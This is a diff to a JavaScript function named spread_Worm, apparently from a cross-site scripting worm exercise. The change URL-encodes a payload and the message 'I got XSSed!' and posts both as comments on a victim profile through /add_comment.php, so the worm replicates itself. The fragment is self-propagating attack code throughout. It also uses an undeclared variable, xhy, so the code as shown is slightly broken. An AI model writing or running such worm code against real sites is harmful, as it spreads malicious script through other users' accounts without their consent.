@@ -82,7 +82,11 @@ function spread_Worm(){
     for(let i = 134; i < 135; i++) {
         var id = i;
         var xhz = new XMLHttpRequest();
-        xhz.open("GET", `/change_photo.php?type=profile&id=${id}&comment=${ppayload}`,true);
+        var urlpayload = encodeURIComponent(ppayload)
+        var urlbrag = encodeURIComponent("I got XSSed!")
+        xhy.open("GET", `/add_comment.php?type=profile&id=${id}&comment=${urlbrag}`,true);
+        xhy.send(); 
+        xhz.open("GET", `/add_comment.php?type=profile&id=${id}&comment=${urlpayload}`,true);
         xhz.send(); 
     }
 }
